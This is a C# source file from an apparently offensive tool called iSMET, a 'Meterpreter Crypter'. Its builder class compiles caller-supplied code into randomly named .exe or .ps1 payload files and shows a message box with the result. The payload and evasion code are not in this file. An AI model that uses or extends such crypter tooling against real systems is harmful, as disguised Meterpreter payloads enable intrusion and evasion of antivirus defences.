using iSMET.CSharp.Collection;
using System;
using System.Windows;

namespace iSMET
{
    public class MeterpreterBuilder
    {
		public string FileName = string.Empty;
		public void ConsoleApplication(string strCSharpCode, string arch)
		{
            var text = GeneralFunction.RandomFileName(0, 5);
            var compiler = new Compiler();
			compiler.Console(text, ".exe", strCSharpCode, arch);
			ReturnMessageBox(text + ".exe", compiler.isCreated);
		}
		public void FormApplication(string strCSharpCode, string arch)
		{
            var text = GeneralFunction.RandomFileName(0, 5);
            var compiler = new Compiler();
			compiler.Form(text, ".exe", strCSharpCode, arch);
			ReturnMessageBox(text + ".exe", compiler.isCreated);
		}
		public void PowerShell(string strCSharpCode)
		{
            var text = GeneralFunction.RandomFileName(0, 5);
            var compiler = new Compiler();
			compiler.PowerShell(text, ".ps1", strCSharpCode);
			ReturnMessageBox(text + ".ps1", compiler.isCreated);
		}
		private void ReturnMessageBox(string fileName, bool isCreated)
		{
			if (isCreated)
			{
				FileName = fileName;
				MessageBox.Show($"File Created!{Environment.NewLine}{fileName}", $"iSMET - Meterpreter Crypter", MessageBoxButton.OK, MessageBoxImage.Asterisk);
			}
			else
			{
				MessageBox.Show("File can not be created", "iSMET - Meterpreter Crypter", MessageBoxButton.OK, MessageBoxImage.Hand);
			}
		}
	}
}
